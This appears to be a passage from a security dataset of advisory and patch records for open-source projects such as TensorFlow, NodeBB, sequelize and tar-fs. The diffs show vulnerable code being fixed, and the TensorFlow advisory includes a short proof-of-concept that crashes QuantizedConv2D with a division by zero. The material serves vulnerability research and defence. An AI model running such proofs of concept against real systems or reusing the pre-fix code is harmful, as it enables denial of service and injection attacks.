int batch = is_1d ? 0 : indices_values(idx, 0);\\n+      if (batch >= num_batches) {\\n+        OP_REQUIRES(context, batch < num_batches,\\n+                    errors::InvalidArgument(\\n+                        \"Indices value along the first dimension must be \",\\n+                        \"lower than the first index of the shape.\", \"Got \",\\n+                        batch, \" as batch and \", num_batches,\\n+                        \" as the first dimension of the shape.\"));\\n+      }\\n       const auto& value = values_values(idx);\\n       if (value >= 0 && (maxlength_ <= 0 || value < maxlength_)) {\\n         if (binary_output_) {'}}","message_norm":"fix segfaults in `tf.raw_ops.sparsecountsparseoutput`.\n\npiperorigin-revid: 360547563\nchange-id: i781c7af4b54a63d867c6e18d43a44d64a5c4e7c9","language":"en","entities":"[('segfaults', 'SECWORD', ''), ('360547563', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/count_ops.cc'])","num_files":1.0},{"index":3328,"vuln_id":"GHSA-ww4x-rwq6-qpgf","cwe_id":"{'CWE-352'}","score":0.0,"chain":"{'https:\/\/github.com\/rubysec\/ruby-advisory-db\/commit\/aef9f623c0be838234d53baf18977564804da397'}","dataset":"osv","summary":"Cross-site Request Forgery in OmniAuth The request phase of the OmniAuth Ruby gem (1.9.1 and earlier) is vulnerable to Cross-Site Request Forgery when used as part of the Ruby on Rails framework, allowing accounts to be connected without user intent, user interaction, or feedback to the user. This permits a secondary account to be able to sign into the web application as the primary account.\n\nAs of v2 OmniAuth no longer has the vulnerable configuration by default, but it is still possible to configure OmniAuth in such a way that the web application becomes vulnerable to Cross-Site Request Forgery. There is a recommended remediation described [here](https:\/\/github.com\/omniauth\/omniauth\/wiki\/Resolving-CVE-2015-9284).","published_date":"2019-05-29","chain_len":1,"project":"https:\/\/github.com\/rubysec\/ruby-advisory-db","commit_href":"https:\/\/github.com\/rubysec\/ruby-advisory-db\/commit\/aef9f623c0be838234d53baf18977564804da397","commit_sha":"aef9f623c0be838234d53baf18977564804da397","patch":"SINGLE","chain_ord":"['aef9f623c0be838234d53baf18977564804da397']","before_first_fix_commit":"{'f05618a2eac8817b13e31f15940fe32c5d4ff6b6'}","last_fix_commit":"aef9f623c0be838234d53baf18977564804da397","chain_ord_pos":1.0,"commit_datetime":"01\/11\/2021, 22:02:34","message":"Add v2.0.0 as a patched version for CVE-2015-9284\n\nhttps:\/\/github.com\/omniauth\/omniauth\/releases\/tag\/v2.0.0","author":"Reed Loden","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'gems\/omniauth\/CVE-2015-9284.yml': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rubysec\/ruby-advisory-db\/raw\/aef9f623c0be838234d53baf18977564804da397\/gems%2Fomniauth%2FCVE-2015-9284.yml', 'patch': '@@ -20,6 +20,9 @@ description: |\\n cvss_v2: 6.8\\n cvss_v3: 8.8\\n \\n+patched_versions:\\n+  - \">= 2.0.0\"\\n+\\n related:\\n   url:\\n     - https:\/\/github.com\/omniauth\/omniauth\/pull\/809'}}","message_norm":"add v2.0.0 as a patched version for cve-2015-9284\n\nhttps:\/\/github.com\/omniauth\/omniauth\/releases\/tag\/v2.0.0","language":"en","entities":"[('add', 'ACTION', ''), ('v2.0.0', 'VERSION', ''), ('patched', 'ACTION', ''), ('cve-2015-9284', 'VULNID', 'CVE'), ('https:\/\/github.com\/omniauth\/omniauth\/releases\/tag\/v2.0.0', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['gems\/omniauth\/CVE-2015-9284.yml'])","num_files":1.0},{"index":3330,"vuln_id":"GHSA-wwgf-3xp7-cxj4","cwe_id":"{'CWE-200'}","score":5.9,"chain":"{'https:\/\/github.com\/FriendsOfPHP\/security-advisories\/commit\/942fd37245cb724ba8cc8d6f11f075a1bd53b338'}","dataset":"osv","summary":"Potentially sensitive data exposure in Symfony Web Socket Bundle ### Impact\nInside `Gos\\Bundle\\WebSocketBundle\\Server\\App\\Dispatcher\\TopicDispatcher::onPublish()`, messages are arbitrarily broadcasted to the related Topic if `Gos\\Bundle\\WebSocketBundle\\Server\\App\\Dispatcher\\TopicDispatcher::dispatch()` does not succeed.  The `dispatch()` method can be considered to not succeed if (depending on the version of the bundle) the callback defined on a topic route is misconfigured, a `Gos\\Bundle\\WebSocketBundle\\Topic\\TopicInterface` implementation is not found for the callback, a topic which also implements `Gos\\Bundle\\WebSocketBundle\\Topic\\SecuredTopicInterface` rejects the connection, or an Exception is unhandled.  This can result in an unintended broadcast to the websocket server potentially with data that should be considered sensitive.\n\n### Patches\nIn 1.10.4, 2.6.1, and 3.3.0, `Gos\\Bundle\\WebSocketBundle\\Server\\App\\Dispatcher\\TopicDispatcher::onPublish()` has been changed to no longer broadcast an event's data if `Gos\\Bundle\\WebSocketBundle\\Server\\App\\Dispatcher\\TopicDispatcher::dispatch()` fails.\n\n### Workarounds\nUpgrade to 1.10.4, 2.6.1, and 3.3.0\n\nNote, the 1.x branch is considered end of support as of July 1, 2020.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [this repository](https:\/\/github.com\/GeniusesOfSymfony\/WebSocketBundle)","published_date":"2020-07-07","chain_len":1,"project":"https:\/\/github.com\/FriendsOfPHP\/security-advisories","commit_href":"https:\/\/github.com\/FriendsOfPHP\/security-advisories\/commit\/942fd37245cb724ba8cc8d6f11f075a1bd53b338","commit_sha":"942fd37245cb724ba8cc8d6f11f075a1bd53b338","patch":"SINGLE","chain_ord":"['942fd37245cb724ba8cc8d6f11f075a1bd53b338']","before_first_fix_commit":"{'c6fc7221e152c3a73fed562ad9c815ccf258a476'}","last_fix_commit":"942fd37245cb724ba8cc8d6f11f075a1bd53b338","chain_ord_pos":1.0,"commit_datetime":"07\/06\/2020, 14:36:56","message":"Add gos\/web-socket-bundle advisory","author":"Michael Babker","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'gos\/web-socket-bundle\/2020-07-06-1.yaml': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'added', 'raw_url': 'https:\/\/github.com\/FriendsOfPHP\/security-advisories\/raw\/942fd37245cb724ba8cc8d6f11f075a1bd53b338\/gos%2Fweb-socket-bundle%2F2020-07-06-1.yaml', 'patch': \"@@ -0,0 +1,13 @@\\n+title:     Potentially sensitive data exposure\\n+link:      https:\/\/github.com\/GeniusesOfSymfony\/WebSocketBundle\/security\/advisories\/GHSA-wwgf-3xp7-cxj4\\n+branches:\\n+    1.x:\\n+        time:       2020-07-06 14:08:35\\n+        versions:   ['<1.10.4']\\n+    3.x:\\n+        time:       2020-07-06 14:08:35\\n+        versions:   ['>=2.0.0', '<2.6.1']\\n+    3.x:\\n+        time:       2020-07-06 14:08:35\\n+        versions:   ['>=3.0.0', '<3.3.0']\\n+reference: composer:\/\/gos\/web-socket-bundle\"}}","message_norm":"add gos\/web-socket-bundle advisory","language":"en","entities":"[('add', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['gos\/web-socket-bundle\/2020-07-06-1.yaml'])","num_files":1.0},{"index":3334,"vuln_id":"GHSA-wx69-rvg3-x7fc","cwe_id":"{'CWE-79'}","score":9.0,"chain":"{'https:\/\/github.com\/NodeBB\/NodeBB\/commit\/1783f918bc19568f421473824461ff2ed7755e4c'}","dataset":"osv","summary":"XSS via prototype pollution in NodeBB  ### Impact\nA prototype pollution vulnerability in the uploader module allowed a malicious user to inject arbitrary data (i.e. javascript) into the DOM, theoretically allowing for an account takeover when used in conjunction with a path traversal vulnerability disclosed at the same time as this report.\n\n### Patches\nThe vulnerability has been patched as of v1.18.5.\n\n### Workarounds\nCherry-pick commit hash 1783f918bc19568f421473824461ff2ed7755e4c to receive this patch in lieu of a full upgrade.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@nodebb.org](mailto:security@nodebb.org)","published_date":"2021-11-30","chain_len":1,"project":"https:\/\/github.com\/NodeBB\/NodeBB","commit_href":"https:\/\/github.com\/NodeBB\/NodeBB\/commit\/1783f918bc19568f421473824461ff2ed7755e4c","commit_sha":"1783f918bc19568f421473824461ff2ed7755e4c","patch":"SINGLE","chain_ord":"['1783f918bc19568f421473824461ff2ed7755e4c']","before_first_fix_commit":"{'c8b2fc46dc698db687379106b3f01c71b80f495f'}","last_fix_commit":"1783f918bc19568f421473824461ff2ed7755e4c","chain_ord_pos":1.0,"commit_datetime":"10\/25\/2021, 17:17:33","message":"fix: guard against prototype pollution","author":"Bar\u0131\u015f Soner U\u015fakl\u0131","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'src\/socket.io\/uploads.js': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NodeBB\/NodeBB\/raw\/1783f918bc19568f421473824461ff2ed7755e4c\/src%2Fsocket.io%2Fuploads.js', 'patch': \"@@ -15,11 +15,12 @@ uploads.upload = async function (socket, data) {\\n \\t\\t'user.updateCover': socketUser.updateCover,\\n \\t\\t'groups.cover.update': socketGroup.cover.update,\\n \\t};\\n-\\tif (!socket.uid || !data || !data.chunk || !data.params || !data.params.method || !methodToFunc[data.params.method]) {\\n+\\tif (!socket.uid || !data || !data.chunk ||\\n+\\t\\t!data.params || !data.params.method || !methodToFunc.hasOwnProperty(data.params.method)) {\\n \\t\\tthrow new Error('[[error:invalid-data]]');\\n \\t}\\n \\n-\\tinProgress[socket.id] = inProgress[socket.id] || {};\\n+\\tinProgress[socket.id] = inProgress[socket.id] || Object.create(null);\\n \\tconst socketUploads = inProgress[socket.id];\\n \\tconst { method } = data.params;\"}}","message_norm":"fix: guard against prototype pollution","language":"en","entities":"[('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/socket.io\/uploads.js'])","num_files":1.0},{"index":3339,"vuln_id":"GHSA-wxj7-97fp-j53j","cwe_id":"{'CWE-29', 'CWE-668'}","score":9.8,"chain":"{'https:\/\/github.com\/Mostafa-Samir\/zip-local\/commit\/949446a95a660c0752b1db0c654f0fd619ae6085'}","dataset":"osv","summary":"Exposure of Resource to Wrong Sphere in Zip-Local The package zip-local before 0.3.5 are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) which can lead to an extraction of a crafted file outside the intended extraction directory.","published_date":"2022-02-01","chain_len":1,"project":"https:\/\/github.com\/Mostafa-Samir\/zip-local","commit_href":"https:\/\/github.com\/Mostafa-Samir\/zip-local\/commit\/949446a95a660c0752b1db0c654f0fd619ae6085","commit_sha":"949446a95a660c0752b1db0c654f0fd619ae6085","patch":"SINGLE","chain_ord":"['949446a95a660c0752b1db0c654f0fd619ae6085']","before_first_fix_commit":"{'6bb9b59733df379ac168aa705790bd8339b4bf9b'}","last_fix_commit":"949446a95a660c0752b1db0c654f0fd619ae6085","chain_ord_pos":1.0,"commit_datetime":"12\/30\/2021, 16:05:29","message":"add test for sync unzipping a zip-slip attack file","author":"Mostafa Samir","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'tests\/unzip.sync.test.js': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Mostafa-Samir\/zip-local\/raw\/949446a95a660c0752b1db0c654f0fd619ae6085\/tests%2Funzip.sync.test.js', 'patch': '@@ -27,6 +27,13 @@ describe(\"Unzipping synchronously\", function () {\\n         zipper.sync.unzip(\".\/tests\/assets\/hello.zip\").save(\".\/tests\/assets\/hello-sync-unzip\/\");\\n     });\\n \\n+    it(\"should raise an error when an entry is outside extraction path\", function () {\\n+        fs.mkdirSync(\".\/tests\/assets\/zip-slip-sync\");\\n+        expect(\\n+            zipper.sync.unzip(\".\/tests\/assets\/zip-slip.zip\").save(\".\/tests\/assets\/zip-slip-sync\")\\n+        ).to.throw(\"Entry is outside the extraction path\")\\n+    });\\n+\\n     it(\"checks if unzipped files on disk contain correct data\", function (done) {\\n \\n         fs.readFile(\".\/tests\/assets\/hello-sync-unzip\/hello\/says-hello\", \\'utf8\\', function (err, data) {'}}","message_norm":"add test for sync unzipping a zip-slip attack file","language":"en","entities":"[('add', 'ACTION', ''), ('attack', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tests\/unzip.sync.test.js'])","num_files":1.0},{"index":3344,"vuln_id":"GHSA-x28w-hvwc-mp75","cwe_id":"{'CWE-94', 'CWE-96'}","score":7.7,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/b2baab6e582b2efe63788d367a2bb61a2fa26470'}","dataset":"osv","summary":"Static Code Injection in Microweber Microweber is a new generation CMS with drag and drop. Prior to version 1.3, Microweber is vulnerable to static code injection.","published_date":"2022-03-11","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/b2baab6e582b2efe63788d367a2bb61a2fa26470","commit_sha":"b2baab6e582b2efe63788d367a2bb61a2fa26470","patch":"SINGLE","chain_ord":"['b2baab6e582b2efe63788d367a2bb61a2fa26470']","before_first_fix_commit":"{'a15da374af81c3cd312ee1639e4c6f56c4839f7e'}","last_fix_commit":"b2baab6e582b2efe63788d367a2bb61a2fa26470","chain_ord_pos":1.0,"commit_datetime":"03\/09\/2022, 11:13:43","message":"Update ContactInformationTrait.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 9, 'deletions': 4, 'total': 13}","files":"{'src\/MicroweberPackages\/Checkout\/Http\/Controllers\/Traits\/ContactInformationTrait.php': {'additions': 9, 'deletions': 4, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/b2baab6e582b2efe63788d367a2bb61a2fa26470\/src%2FMicroweberPackages%2FCheckout%2FHttp%2FControllers%2FTraits%2FContactInformationTrait.php', 'patch': \"@@ -36,11 +36,16 @@ public function contactInformation() {\\n \\n     public function contactInformationSave(Request $request) {\\n \\n+        $firstName = strip_tags($request->get('first_name'));\\n+        $lastName = strip_tags($request->get('last_name'));\\n+        $email = strip_tags($request->get('email'));\\n+        $phone = strip_tags($request->get('phone'));\\n+\\n         session_append_array('checkout_v2', [\\n-            'first_name'=> $request->get('first_name'),\\n-            'last_name'=> $request->get('last_name'),\\n-            'email'=> $request->get('email'),\\n-            'phone'=> $request->get('phone')\\n+            'first_name'=> $firstName,\\n+            'last_name'=> $lastName,\\n+            'email'=> $email,\\n+            'phone'=> $phone\\n         ]);\\n \\n         $validate = $this->_validateContactInformation($request->all());\"}}","message_norm":"update contactinformationtrait.php","language":"fr","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Checkout\/Http\/Controllers\/Traits\/ContactInformationTrait.php'])","num_files":1.0},{"index":3347,"vuln_id":"GHSA-x2jc-pwfj-h9p3","cwe_id":"{'CWE-89'}","score":0.0,"chain":"{'https:\/\/github.com\/sequelize\/sequelize\/commit\/c876192aa6ce1f67e22b26a4d175b8478615f42d'}","dataset":"osv","summary":"SQL Injection in sequelize Affected versions of `sequelize` use MySQL's backslash-based escape syntax when connecting to SQLite, despite the fact that SQLite uses PostgreSQL's escape syntax, which can result in a SQL Injection vulnerability.\n\n\n## Recommendation\n\nUpdate to version 1.7.0-alpha3 or later.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/sequelize\/sequelize","commit_href":"https:\/\/github.com\/sequelize\/sequelize\/commit\/c876192aa6ce1f67e22b26a4d175b8478615f42d","commit_sha":"c876192aa6ce1f67e22b26a4d175b8478615f42d","patch":"SINGLE","chain_ord":"['c876192aa6ce1f67e22b26a4d175b8478615f42d']","before_first_fix_commit":"{'7dc35e3889e3fa0859b96be41092717444cc2a38'}","last_fix_commit":"c876192aa6ce1f67e22b26a4d175b8478615f42d","chain_ord_pos":1.0,"commit_datetime":"06\/15\/2013, 03:24:59","message":"Fix string escaping for sqlite\n\nSQLite was defaulting to the MySQL backslash-escaped style, but it uses\npostgres-style escaping. This is a SQL-injection vulnerability, and\nshouldn't be taken lightly (although SQLite is mostly for testing).","author":"Benjamin Woodruff","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'lib\/sql-string.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sequelize\/sequelize\/raw\/c876192aa6ce1f67e22b26a4d175b8478615f42d\/lib%2Fsql-string.js', 'patch': '@@ -37,8 +37,9 @@ SqlString.escape = function(val, stringifyObjects, timeZone, dialect) {\\n     }\\n   }\\n \\n-  if (dialect == \"postgres\") {\\n+  if (dialect === \"postgres\" || dialect === \"sqlite\") {\\n     \/\/ http:\/\/www.postgresql.org\/docs\/8.2\/static\/sql-syntax-lexical.html#SQL-SYNTAX-STRINGS\\n+    \/\/ http:\/\/stackoverflow.com\/q\/603572\/130598\\n     val = val.replace(\/\\'\/g, \"\\'\\'\");\\n   } else {\\n     val = val.replace(\/[\\\\0\\\\n\\\\r\\\\b\\\\t\\\\\\\\\\\\\\'\\\\\"\\\\x1a]\/g, function(s) {'}}","message_norm":"fix string escaping for sqlite\n\nsqlite was defaulting to the mysql backslash-escaped style, but it uses\npostgres-style escaping. this is a sql-injection vulnerability, and\nshouldn't be taken lightly (although sqlite is mostly for testing).","language":"en","entities":"[('fix', 'ACTION', ''), ('escaping', 'SECWORD', ''), ('escaped', 'SECWORD', ''), ('escaping', 'SECWORD', ''), ('injection', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/sql-string.js'])","num_files":1.0},{"index":3349,"vuln_id":"GHSA-x2mc-8fgj-3wmr","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/mafintosh\/tar-fs\/commit\/06672828e6fa29ac8551b1b6f36c852a9a3c58a2'}","dataset":"osv","summary":"Improper Input Validation in tar-fs A vulnerability was found in tar-fs before 1.16.2. An Arbitrary File Overwrite issue exists when extracting a tarball containing a hardlink to a file that already exists on the system, in conjunction with a later plain file with the same name as the hardlink. This plain file content replaces the existing file content.","published_date":"2019-05-01","chain_len":1,"project":"https:\/\/github.com\/mafintosh\/tar-fs","commit_href":"https:\/\/github.com\/mafintosh\/tar-fs\/commit\/06672828e6fa29ac8551b1b6f36c852a9a3c58a2","commit_sha":"06672828e6fa29ac8551b1b6f36c852a9a3c58a2","patch":"SINGLE","chain_ord":"['06672828e6fa29ac8551b1b6f36c852a9a3c58a2']","before_first_fix_commit":"{'7b4ab17e950832cfd3e67421e48898fdb50318fc'}","last_fix_commit":"06672828e6fa29ac8551b1b6f36c852a9a3c58a2","chain_ord_pos":1.0,"commit_datetime":"04\/30\/2018, 11:20:56","message":"force hardlink targets to be in the tar","author":"Mathias Buus","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mafintosh\/tar-fs\/raw\/06672828e6fa29ac8551b1b6f36c852a9a3c58a2\/index.js', 'patch': \"@@ -261,7 +261,7 @@ exports.extract = function (cwd, opts) {\\n     var onlink = function () {\\n       if (win32) return next() \/\/ skip links on win for now before it can be tested\\n       xfs.unlink(name, function () {\\n-        var srcpath = path.resolve(cwd, header.linkname)\\n+        var srcpath = path.join(cwd, path.join('\/', header.linkname))\\n \\n         xfs.link(srcpath, name, function (err) {\\n           if (err && err.code === 'EPERM' && opts.hardlinkAsFilesFallback) {\"}}","message_norm":"force hardlink targets to be in the tar","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":3350,"vuln_id":"GHSA-x2p8-rgfm-qw3v","cwe_id":"{'CWE-863'}","score":9.8,"chain":"{'https:\/\/github.com\/stanfordnlp\/CoreNLP\/commit\/5ee097dbede547023e88f60ed3f430ff09398b87'}","dataset":"osv","summary":"Access Control vulnerability within CoreNLP An Incorrect Access Control vulnerability exists in CoreNLP 4.3.2 via the classifier in NERServlet.java (lines 158 and 159).","published_date":"2022-02-25","chain_len":1,"project":"https:\/\/github.com\/stanfordnlp\/CoreNLP","commit_href":"https:\/\/github.com\/stanfordnlp\/CoreNLP\/commit\/5ee097dbede547023e88f60ed3f430ff09398b87","commit_sha":"5ee097dbede547023e88f60ed3f430ff09398b87","patch":"SINGLE","chain_ord":"['5ee097dbede547023e88f60ed3f430ff09398b87']","before_first_fix_commit":"{'85e305bf63b3954e6266801175579a8b81769709'}","last_fix_commit":"5ee097dbede547023e88f60ed3f430ff09398b87","chain_ord_pos":1.0,"commit_datetime":"11\/26\/2021, 22:07:33","message":"Address issue #1222: verify that classifier and outputFormat are valid values before returning them in headers.  Should sanitize malicious output","author":"John Bauer","comments":null,"stats":"{'additions': 15, 'deletions': 7, 'total': 22}","files":"{'src\/edu\/stanford\/nlp\/ie\/ner\/webapp\/NERServlet.java': {'additions': 15, 'deletions': 7, 'changes': 22, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/stanfordnlp\/CoreNLP\/raw\/5ee097dbede547023e88f60ed3f430ff09398b87\/src%2Fedu%2Fstanford%2Fnlp%2Fie%2Fner%2Fwebapp%2FNERServlet.java', 'patch': '@@ -63,9 +63,9 @@ public void init() throws ServletException {\\n       log(classifier);\\n     }\\n \\n-    ners = Generics.newHashMap();\\n+    ners = new HashMap<>();\\n     for (String classifier : classifiers) {\\n-      CRFClassifier model = null;\\n+      CRFClassifier<CoreMap> model = null;\\n       String filename = \"\/WEB-INF\/data\/models\/\" + classifier;\\n       InputStream is = getServletConfig().getServletContext().getResourceAsStream(filename);\\n \\n@@ -154,15 +154,23 @@ private void addResults(HttpServletRequest request,\\n       classifier = this.defaultClassifier;\\n     }\\n \\n-    response.addHeader(\"classifier\", classifier);\\n-    response.addHeader(\"outputFormat\", outputFormat);\\n-    response.addHeader(\"preserveSpacing\", String.valueOf(preserveSpacing));\\n+    CRFClassifier<CoreMap> nerModel = ners.get(classifier);\\n+    \/\/ check that we weren\\'t asked for a classifier that doesn\\'t exist\\n+    if (nerModel == null) {\\n+      out.print(StringEscapeUtils.escapeHtml4(\"Unknown model \" + classifier));\\n+      return;\\n+    }\\n \\n     if (outputFormat.equals(\"highlighted\")) {\\n-      outputHighlighting(out, ners.get(classifier), input);\\n+      outputHighlighting(out, nerModel, input);\\n     } else {\\n-      out.print(StringEscapeUtils.escapeHtml4(ners.get(classifier).classifyToString(input, outputFormat, preserveSpacing)));\\n+      out.print(StringEscapeUtils.escapeHtml4(nerModel.classifyToString(input, outputFormat, preserveSpacing)));\\n     }\\n+\\n+    response.addHeader(\"classifier\", classifier);\\n+    \/\/ a non-existent outputFormat would have just thrown an exception\\n+    response.addHeader(\"outputFormat\", outputFormat);\\n+    response.addHeader(\"preserveSpacing\", String.valueOf(preserveSpacing));\\n   }\\n \\n   private static void outputHighlighting(PrintWriter out,'}}","message_norm":"address issue #1222: verify that classifier and outputformat are valid values before returning them in headers.  should sanitize malicious output","language":"en","entities":"[('issue', 'FLAW', ''), ('#1222', 'ISSUE', ''), ('verify', 'ACTION', ''), ('sanitize', 'SECWORD', ''), ('malicious', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/edu\/stanford\/nlp\/ie\/ner\/webapp\/NERServlet.java'])","num_files":1.0},{"index":3360,"vuln_id":"GHSA-x44x-r84w-8v67","cwe_id":"{'CWE-287'}","score":6.5,"chain":"{'https:\/\/github.com\/LemonLDAPNG\/node-lemonldap-ng-handler\/commit\/136aa83ed431462fa42ce17b7f9b24e056de06be'}","dataset":"osv","summary":"Lack of URL normalization may lead to authorization bypass when URL access rules are used ### Impact\nWhen access rules are used inside a protected host, some URL encodings may bypass filtering system.\n\n### Patches\nVersion 0.5.2 includes a patch that fixes the vulnerability\n\n### Workarounds\nNo way for users to fix or remediate the vulnerability without upgrading\n\n### References\nhttps:\/\/gitlab.ow2.org\/lemonldap-ng\/lemonldap-ng\/-\/issues\/2290\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [this repository](https:\/\/github.com\/LemonLDAPNG\/node-lemonldap-ng-handler\/issues) or [LemonLDAP::NG GitLab](https:\/\/gitlab.ow2.org\/lemonldap-ng\/lemonldap-ng\/-\/issues)\n* Email us at [lemonldap-ng-users@ow2.org](mailto:lemonldap-ng-users@ow2.org)","published_date":"2020-09-09","chain_len":1,"project":"https:\/\/github.com\/LemonLDAPNG\/node-lemonldap-ng-handler","commit_href":"https:\/\/github.com\/LemonLDAPNG\/node-lemonldap-ng-handler\/commit\/136aa83ed431462fa42ce17b7f9b24e056de06be","commit_sha":"136aa83ed431462fa42ce17b7f9b24e056de06be","patch":"SINGLE","chain_ord":"['136aa83ed431462fa42ce17b7f9b24e056de06be']","before_first_fix_commit":"{'d6fac9350024d9eef1c180f4e3a6a0ce65f199a8'}","last_fix_commit":"136aa83ed431462fa42ce17b7f9b24e056de06be","chain_ord_pos":1.0,"commit_datetime":"09\/09\/2020, 08:04:46","message":"Normalize URL (related to https:\/\/gitlab.ow2.org\/lemonldap-ng\/lemonldap-ng\/-\/issues\/2290 and CVE-2020-24660)","author":"Xavier Guimard","comments":null,"stats":"{'additions': 4, 'deletions': 3, 'total': 7}","files":"{'src\/lib\/index.coffee': {'additions': 4, 'deletions': 3, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/LemonLDAPNG\/node-lemonldap-ng-handler\/raw\/136aa83ed431462fa42ce17b7f9b24e056de06be\/src%2Flib%2Findex.coffee', 'patch': '@@ -4,6 +4,7 @@\\n # See README.md for license and copyright\\n ###\\n conf = null\\n+normalizeUrl = require \\'normalize-url\\'\\n \\n class Handler\\n \\tconstructor: (args) ->\\n@@ -15,7 +16,7 @@ class Handler\\n \\trun: (req, res, next) ->\\n \\t\\tself = @\\n \\t\\tvhost = req.headers.host\\n-\\t\\turi = decodeURI req.url\\n+\\t\\turi = normalizeUrl req.url\\n \\t\\tif @conf.tsv.maintenance[vhost]\\n \\t\\t\\tself.logger.info \"Go to portal with maintenance error code #{vhost}\"\\n \\t\\t\\treturn @setError res, \\'\/\\', 503, \\'Service Temporarily Unavailable\\'\\n@@ -184,7 +185,7 @@ class Handler\\n \\t\\t\\treturn res\\n \\t\\turlc = @conf.tsv.portal()\\n \\t\\tif uri\\n-\\t\\t\\turlc += \\'?url=\\' + new Buffer(encodeURI(uri)).toString(\\'base64\\')\\n+\\t\\t\\turlc += \\'?url=\\' + new Buffer.from(encodeURI(uri)).toString(\\'base64\\')\\n \\t\\tif args\\n \\t\\t\\turlc += if uri then \\'&\\' else \\'?\\'\\n \\t\\t\\turlc += args\\n@@ -203,7 +204,7 @@ class Handler\\n \\n \\tsetError: (res, uri, code, txt) ->\\n \\t\\tif @conf.tsv.useRedirectOnError\\n-\\t\\t\\tu = @conf.tsv.portal() + \"?lmError=#{code}&url=\" + new Buffer(encodeURI(uri)).toString(\\'base64\\')\\n+\\t\\t\\tu = @conf.tsv.portal() + \"?lmError=#{code}&url=\" + new Buffer.from(encodeURI(uri)).toString(\\'base64\\')\\n \\t\\t\\t@logger.debug \"Redirecting to #{u}\"\\n \\t\\t\\tif res.redirect?\\n \\t\\t\\t\\tres.redirect u'}}","message_norm":"normalize url (related to https:\/\/gitlab.ow2.org\/lemonldap-ng\/lemonldap-ng\/-\/issues\/2290 and cve-2020-24660)","language":"en","entities":"[('https:\/\/gitlab.ow2.org\/lemonldap-ng\/lemonldap-ng\/-\/issues\/2290', 'URL', ''), ('cve-2020-24660', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib\/index.coffee'])","num_files":1.0},{"index":3363,"vuln_id":"GHSA-x4g7-fvjj-prg8","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cfa91be9863a91d5105a3b4941096044ab32036b'}","dataset":"osv","summary":"Division by 0 in `QuantizedConv2D` ### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.QuantizedConv2D`:\n\n```python\nimport tensorflow as tf\n\ninput = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)\nfilter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)\nmin_input = tf.constant(0.0)\nmax_input = tf.constant(0.0001)\nmin_filter = tf.constant(0.0)\nmax_filter = tf.constant(0.0001)\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"               \n                               \n\ntf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)\n```\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/00e9a4d67d76703fa1aee33dac582acf317e0e81\/tensorflow\/core\/kernels\/quantized_conv_ops.cc#L257-L259) does a division by a quantity that is controlled by the caller: \n\n```cc\nconst int filter_value_count = filter_width * filter_height * input_depth;\nconst int64 patches_per_chunk = kMaxChunkSize \/ (filter_value_count * sizeof(T1));\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [cfa91be9863a91d5105a3b4941096044ab32036b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cfa91be9863a91d5105a3b4941096044ab32036b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with 